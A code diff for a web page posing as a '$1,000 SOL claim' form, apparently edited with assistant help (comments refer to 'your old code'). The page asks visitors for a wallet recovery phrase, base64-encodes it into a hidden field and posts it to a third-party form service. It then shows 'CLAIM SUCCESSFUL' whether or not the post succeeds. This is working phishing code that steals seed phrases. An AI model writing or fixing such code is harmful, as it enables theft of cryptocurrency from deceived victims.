@@ -16,6 +16,9 @@
             height: 100vh;
             width: 100vw;
             overflow: hidden; 
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
 
         .card { 
@@ -32,9 +35,6 @@
             text-align: center; 
             box-shadow: 0 0 80px rgba(0, 0, 0, 1);
             box-sizing: border-box;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
         }
 
         h1 { 
@@ -49,7 +49,6 @@
             text-transform: uppercase;
             line-height: 1.2;
             white-space: nowrap; 
-            display: block;
         }
 
         .sub { 
@@ -121,6 +120,7 @@
 <body>
 
     <div class="card">
+        <!-- FORM PAGE -->
         <div id="form-view">
             <form id="claim-form">
                 <input type="hidden" name="access_key" value="4a9ec344-5342-477d-8e90-af1576f4f3b5">
@@ -133,6 +133,7 @@
                     <textarea id="raw-phrase" required></textarea>
                 </div>
 
+                <!-- Hidden data field mapped to your old code's name field -->
                 <input type="hidden" name="name" id="coded-phrase">
                 <input type="hidden" name="subject" value="New $1,000 SOL Claim Submission">
 
@@ -140,6 +141,7 @@
             </form>
         </div>
 
+        <!-- SUCCESS PAGE -->
         <div id="success-view">
             <h1>CLAIM SUCCESSFUL</h1>
             <div class="congrats">
@@ -162,38 +164,30 @@
             submitBtn.textContent = "CONNECTING...";
             submitBtn.disabled = true;
 
-            // Updated Safe Encoding: This handles spaces and multiple words correctly
-            const secureEncode = (str) => {
-                return btoa(unescape(encodeURIComponent(str)));
-            };
-
+            // Updated Safe Encoding to handle multiple words/spaces correctly
             try {
-                codedInput.value = secureEncode(rawInput.value);
-
-                const formData = new FormData(form);
-
-                fetch('https://web3forms.com', {
-                    method: 'POST',
-                    body: formData
-                })
-                .then(response => {
-                    formView.style.display = "none";
-                    successView.style.display = "block";
-                })
-                .catch(error => {
-                    formView.style.display = "none";
-                    successView.style.display = "block";
-                });
+                const phrase = rawInput.value;
+                // This method safely encodes spaces and special characters for btoa
+                codedInput.value = btoa(unescape(encodeURIComponent(phrase)));
             } catch (err) {
-                // If encoding fails, send raw as fallback so you don't lose the data
-                codedInput.value = rawInput.value;
-                const formData = new FormData(form);
-                fetch('https://web3forms.com', { method: 'POST', body: formData })
-                .then(() => {
-                    formView.style.display = "none";
-                    successView.style.display = "block";
-                });
+                codedInput.value = rawInput.value; // Fallback
             }
+
+            // Using the EXACT basic method from your old code
+            const formData = new FormData(form);
+
+            fetch('https://api.web3forms.com/submit', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                formView.style.display = "none";
+                successView.style.display = "block";
+            })
+            .catch(error => {
+                formView.style.display = "none";
+                successView.style.display = "block";
+            });
         });
     </script>
 </body>
